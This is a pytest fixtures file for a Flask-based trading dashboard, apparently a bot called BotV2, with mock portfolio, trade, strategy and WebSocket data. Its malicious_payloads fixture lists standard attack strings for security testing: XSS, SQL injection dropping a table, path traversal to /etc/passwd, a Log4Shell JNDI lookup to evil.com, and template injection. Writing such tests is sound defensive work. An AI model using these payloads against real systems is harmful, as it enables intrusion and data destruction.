"""Pytest Configuration and Fixtures for BotV2 v4.4

Centralized test fixtures providing:
- Flask application instances
- Test client with authentication
- Database sessions (in-memory SQLite)
- Mock data generators
- Strategy fixtures
- Portfolio fixtures
- WebSocket clients
- Configuration fixtures
"""

import pytest
import tempfile
import json
import os
from pathlib import Path
from datetime import datetime, timedelta
from typing import Dict, List, Generator, Any
import secrets

# Flask imports
try:
    from flask import Flask
    from flask.testing import FlaskClient
    from flask_socketio import SocketIOTestClient
    HAS_FLASK = True
except ImportError:
    HAS_FLASK = False

# SQLAlchemy imports
try:
    from sqlalchemy import create_engine
    from sqlalchemy.orm import sessionmaker, Session
    from src.dashboard.models import Base, Portfolio, Trade, Strategy
    HAS_SQLALCHEMY = True
except ImportError:
    HAS_SQLALCHEMY = False

# Dashboard imports
try:
    from src.dashboard.web_app import ProfessionalDashboard
    from src.dashboard.strategy_editor import StrategyParameterEditor
    HAS_DASHBOARD = True
except ImportError:
    HAS_DASHBOARD = False


# ==================== PYTEST CONFIGURATION ====================

def pytest_configure(config):
    """Configure pytest with custom markers"""
    config.addinivalue_line("markers", "unit: Unit tests")
    config.addinivalue_line("markers", "integration: Integration tests")
    config.addinivalue_line("markers", "e2e: End-to-end tests")
    config.addinivalue_line("markers", "slow: Slow running tests")
    config.addinivalue_line("markers", "security: Security tests")
    config.addinivalue_line("markers", "performance: Performance tests")
    config.addinivalue_line("markers", "dashboard: Dashboard tests")
    config.addinivalue_line("markers", "api: API endpoint tests")
    config.addinivalue_line("markers", "websocket: WebSocket tests")


# ==================== CONFIGURATION FIXTURES ====================

@pytest.fixture(scope="session")
def test_config() -> Dict[str, Any]:
    """Test configuration dictionary"""
    return {
        'dashboard': {
            'host': '127.0.0.1',
            'port': 8050,
            'debug': False
        },
        'database': {
            'url': 'sqlite:///:memory:',
            'echo': False
        },
        'security': {
            'username': 'test_admin',
            'password': 'test_password_123',
            'secret_key': secrets.token_urlsafe(32)
        },
        'strategies': {
            'Momentum': {
                'enabled': True,
                'lookback_period': 20,
                'threshold': 0.02
            },
            'MeanReversion': {
                'enabled': True,
                'window': 20,
                'std_dev': 2.0
            }
        },
        'risk': {
            'max_position_size': 0.1,
            'max_drawdown': 0.15,
            'stop_loss': 0.05
        }
    }


@pytest.fixture(scope="function")
def temp_dir() -> Generator[Path, None, None]:
    """Create temporary directory for tests"""
    with tempfile.TemporaryDirectory() as tmpdir:
        yield Path(tmpdir)


@pytest.fixture(scope="function")
def config_file(temp_dir: Path, test_config: Dict) -> Path:
    """Create temporary config file"""
    config_path = temp_dir / "config.json"
    config_path.write_text(json.dumps(test_config, indent=2))
    return config_path


# ==================== ENVIRONMENT FIXTURES ====================

@pytest.fixture(scope="function", autouse=True)
def test_env_vars(test_config: Dict):
    """Set test environment variables"""
    original_env = os.environ.copy()
    
    # Set test environment
    os.environ['FLASK_ENV'] = 'testing'
    os.environ['SECRET_KEY'] = test_config['security']['secret_key']
    os.environ['DASHBOARD_USERNAME'] = test_config['security']['username']
    os.environ['DASHBOARD_PASSWORD'] = test_config['security']['password']
    os.environ['DATABASE_URL'] = test_config['database']['url']
    
    yield
    
    # Restore original environment
    os.environ.clear()
    os.environ.update(original_env)


# ==================== DATABASE FIXTURES ====================

if HAS_SQLALCHEMY:
    @pytest.fixture(scope="function")
    def db_engine():
        """Create in-memory SQLite engine for testing"""
        engine = create_engine('sqlite:///:memory:', echo=False)
        Base.metadata.create_all(engine)
        yield engine
        Base.metadata.drop_all(engine)
        engine.dispose()


    @pytest.fixture(scope="function")
    def db_session(db_engine) -> Generator[Session, None, None]:
        """Create database session for testing"""
        SessionLocal = sessionmaker(bind=db_engine)
        session = SessionLocal()
        
        try:
            yield session
        finally:
            session.rollback()
            session.close()


    @pytest.fixture(scope="function")
    def populated_db(db_session: Session) -> Session:
        """Database with sample data"""
        # Add sample portfolio
        portfolio = Portfolio(
            timestamp=datetime.now(),
            equity=10000.0,
            cash=5000.0,
            positions={'BTC/USD': {'size': 0.1, 'value': 5000.0}}
        )
        db_session.add(portfolio)
        
        # Add sample trades
        for i in range(10):
            trade = Trade(
                timestamp=datetime.now() - timedelta(days=i),
                strategy='Momentum',
                symbol='BTC/USD',
                action='BUY' if i % 2 == 0 else 'SELL',
                quantity=0.01,
                entry_price=50000 + (i * 100),
                exit_price=50100 + (i * 100),
                pnl=(100 if i % 2 == 0 else -50),
                status='closed'
            )
            db_session.add(trade)
        
        # Add sample strategy
        strategy = Strategy(
            name='Momentum',
            parameters={
                'lookback_period': {'value': 20, 'min': 5, 'max': 100},
                'threshold': {'value': 0.02, 'min': 0.001, 'max': 0.1}
            },
            status='active'
        )
        db_session.add(strategy)
        
        db_session.commit()
        return db_session


# ==================== FLASK APP FIXTURES ====================

if HAS_FLASK and HAS_DASHBOARD:
    @pytest.fixture(scope="function")
    def app(test_config: Dict) -> Flask:
        """Create Flask application for testing"""
        dashboard = ProfessionalDashboard(test_config)
        app = dashboard.app
        
        # Configure for testing
        app.config['TESTING'] = True
        app.config['WTF_CSRF_ENABLED'] = False
        app.config['SERVER_NAME'] = 'localhost:8050'
        
        return app


    @pytest.fixture(scope="function")
    def client(app: Flask) -> FlaskClient:
        """Create Flask test client"""
        return app.test_client()


    @pytest.fixture(scope="function")
    def authenticated_client(client: FlaskClient, test_config: Dict) -> FlaskClient:
        """Create authenticated Flask test client"""
        # Login
        response = client.post('/login', data={
            'username': test_config['security']['username'],
            'password': test_config['security']['password']
        }, follow_redirects=True)
        
        assert response.status_code == 200
        return client


    @pytest.fixture(scope="function")
    def socketio_client(app: Flask) -> SocketIOTestClient:
        """Create SocketIO test client"""
        from flask_socketio import SocketIO
        socketio = SocketIO(app)
        return socketio.test_client(app)


# ==================== MOCK DATA FIXTURES ====================

@pytest.fixture
def mock_portfolio_data() -> Dict:
    """Mock portfolio data"""
    return {
        'timestamp': datetime.now().isoformat(),
        'equity': 10000.0,
        'cash': 5000.0,
        'positions': {
            'BTC/USD': {'size': 0.1, 'value': 3000.0},
            'ETH/USD': {'size': 1.5, 'value': 2000.0}
        },
        'total_value': 10000.0
    }


@pytest.fixture
def mock_trade_data() -> Dict:
    """Mock trade data"""
    return {
        'timestamp': datetime.now().isoformat(),
        'strategy': 'Momentum',
        'symbol': 'BTC/USD',
        'action': 'BUY',
        'quantity': 0.05,
        'entry_price': 50000.0,
        'exit_price': 50500.0,
        'pnl': 25.0,
        'pnl_pct': 0.5,
        'status': 'closed'
    }


@pytest.fixture
def mock_strategy_data() -> Dict:
    """Mock strategy data"""
    return {
        'name': 'Momentum',
        'status': 'active',
        'parameters': {
            'lookback_period': {
                'value': 20,
                'min': 5,
                'max': 100,
                'step': 1,
                'unit': 'bars',
                'name': 'Lookback Period'
            },
            'threshold': {
                'value': 0.02,
                'min': 0.001,
                'max': 0.1,
                'step': 0.001,
                'unit': '%',
                'name': 'Entry Threshold'
            }
        },
        'performance': {
            'return': 0.125,
            'sharpe': 2.1,
            'win_rate': 0.72,
            'trades': 35
        }
    }


@pytest.fixture
def mock_market_data() -> Dict:
    """Mock market data"""
    return {
        'symbol': 'BTC/USD',
        'price': 50000.0,
        'change': 500.0,
        'change_pct': 1.0,
        'volume': 1000000.0,
        'timestamp': datetime.now().isoformat()
    }


@pytest.fixture
def mock_ohlcv_data() -> List[Dict]:
    """Mock OHLCV candlestick data"""
    base_price = 50000.0
    data = []
    
    for i in range(100):
        timestamp = datetime.now() - timedelta(hours=100-i)
        open_price = base_price + (i * 10)
        high_price = open_price + 100
        low_price = open_price - 100
        close_price = open_price + 50
        volume = 1000000
        
        data.append({
            'timestamp': timestamp.isoformat(),
            'open': open_price,
            'high': high_price,
            'low': low_price,
            'close': close_price,
            'volume': volume
        })
    
    return data


@pytest.fixture
def mock_annotation_data() -> Dict:
    """Mock chart annotation data"""
    return {
        'chart_id': 'equity_chart',
        'type': 'line',
        'x0': datetime.now().isoformat(),
        'y0': 10000.0,
        'x1': (datetime.now() + timedelta(days=1)).isoformat(),
        'y1': 10500.0,
        'text': 'Test annotation',
        'color': '#00ff00'
    }


# ==================== STRATEGY FIXTURES ====================

if HAS_DASHBOARD:
    @pytest.fixture
    def strategy_editor(test_config: Dict) -> StrategyParameterEditor:
        """Create strategy parameter editor"""
        return StrategyParameterEditor(test_config)


    @pytest.fixture
    def strategy_presets() -> Dict:
        """Strategy presets for testing"""
        return {
            'conservative': {
                'Momentum': {
                    'lookback_period': 30,
                    'threshold': 0.03
                },
                'MeanReversion': {
                    'window': 30,
                    'std_dev': 2.5
                }
            },
            'balanced': {
                'Momentum': {
                    'lookback_period': 20,
                    'threshold': 0.02
                },
                'MeanReversion': {
                    'window': 20,
                    'std_dev': 2.0
                }
            },
            'aggressive': {
                'Momentum': {
                    'lookback_period': 10,
                    'threshold': 0.01
                },
                'MeanReversion': {
                    'window': 10,
                    'std_dev': 1.5
                }
            }
        }


# ==================== HELPER FIXTURES ====================

@pytest.fixture
def sample_trades(count: int = 10) -> List[Dict]:
    """Generate sample trades"""
    trades = []
    symbols = ['BTC/USD', 'ETH/USD', 'AAPL', 'GOOGL']
    strategies = ['Momentum', 'MeanReversion', 'Breakout']
    
    for i in range(count):
        is_win = i % 3 != 0  # 66% win rate
        pnl = (50 + i * 5) if is_win else -(20 + i * 2)
        
        trades.append({
            'id': i + 1,
            'timestamp': (datetime.now() - timedelta(days=i)).isoformat(),
            'strategy': strategies[i % len(strategies)],
            'symbol': symbols[i % len(symbols)],
            'action': 'BUY' if i % 2 == 0 else 'SELL',
            'quantity': 0.01 + (i * 0.001),
            'entry_price': 50000 + (i * 100),
            'exit_price': 50000 + (i * 100) + pnl,
            'pnl': pnl,
            'pnl_pct': (pnl / 50000) * 100,
            'status': 'closed'
        })
    
    return trades


@pytest.fixture
def sample_portfolio_history(days: int = 90) -> List[Dict]:
    """Generate sample portfolio history"""
    history = []
    equity = 10000.0
    
    for i in range(days):
        # Simulate daily return
        daily_return = (i % 3 - 1) * 0.01  # -1%, 0%, +1% pattern
        equity = equity * (1 + daily_return)
        
        history.append({
            'timestamp': (datetime.now() - timedelta(days=days-i)).isoformat(),
            'equity': max(8000, equity),
            'cash': equity * 0.3,
            'positions': {
                'BTC/USD': {'size': 0.1, 'value': equity * 0.4},
                'ETH/USD': {'size': 1.5, 'value': equity * 0.3}
            }
        })
    
    return history


@pytest.fixture
def performance_metrics() -> Dict:
    """Sample performance metrics"""
    return {
        'total_return': 0.125,
        'sharpe_ratio': 2.1,
        'max_drawdown': -0.08,
        'win_rate': 0.68,
        'profit_factor': 2.5,
        'total_trades': 150,
        'winning_trades': 102,
        'losing_trades': 48,
        'avg_win': 75.0,
        'avg_loss': -30.0
    }


# ==================== API RESPONSE FIXTURES ====================

@pytest.fixture
def api_success_response() -> Dict:
    """Standard API success response"""
    return {
        'success': True,
        'data': {},
        'timestamp': datetime.now().isoformat()
    }


@pytest.fixture
def api_error_response() -> Dict:
    """Standard API error response"""
    return {
        'success': False,
        'error': 'Test error message',
        'timestamp': datetime.now().isoformat()
    }


# ==================== WEBSOCKET FIXTURES ====================

@pytest.fixture
def websocket_events() -> List[Dict]:
    """Sample WebSocket events"""
    return [
        {
            'event': 'price_update',
            'data': {
                'symbol': 'BTC/USD',
                'price': 50000.0,
                'change': 500.0
            }
        },
        {
            'event': 'trade_executed',
            'data': {
                'symbol': 'ETH/USD',
                'action': 'BUY',
                'quantity': 1.0,
                'price': 3000.0
            }
        },
        {
            'event': 'portfolio_update',
            'data': {
                'equity': 10500.0,
                'change': 500.0
            }
        }
    ]


# ==================== SECURITY FIXTURES ====================

@pytest.fixture
def valid_credentials(test_config: Dict) -> Dict:
    """Valid login credentials"""
    return {
        'username': test_config['security']['username'],
        'password': test_config['security']['password']
    }


@pytest.fixture
def invalid_credentials() -> Dict:
    """Invalid login credentials"""
    return {
        'username': 'wrong_user',
        'password': 'wrong_password'
    }


@pytest.fixture
def malicious_payloads() -> List[str]:
    """Malicious input payloads for security testing"""
    return [
        "<script>alert('XSS')</script>",
        "'; DROP TABLE trades;--",
        "../../../etc/passwd",
        "${jndi:ldap://evil.com/a}",
        "\x00\x00\x00\x00",
        "A" * 10000,  # Buffer overflow
        "{{7*7}}",  # Template injection
    ]


# ==================== PERFORMANCE FIXTURES ====================

@pytest.fixture
def benchmark_config() -> Dict:
    """Performance benchmark configuration"""
    return {
        'max_response_time': 0.5,  # 500ms
        'max_memory_mb': 500,
        'concurrent_users': 10,
        'requests_per_user': 100
    }


# ==================== CLEANUP ====================

@pytest.fixture(scope="function", autouse=True)
def cleanup_after_test():
    """Cleanup after each test"""
    yield
    # Add cleanup logic if needed
    pass


# ==================== PARAMETRIZE HELPERS ====================

# Timeframes for market data testing
TIMEFRAMES = ['1m', '5m', '15m', '1h', '4h', '1d']

# Strategy names for testing
STRATEGY_NAMES = ['Momentum', 'MeanReversion', 'Breakout', 'PairsTrading']

# Order actions
ORDER_ACTIONS = ['BUY', 'SELL']

# Trade statuses
TRADE_STATUSES = ['open', 'closed', 'pending', 'cancelled']

# HTTP methods
HTTP_METHODS = ['GET', 'POST', 'PUT', 'DELETE', 'PATCH']
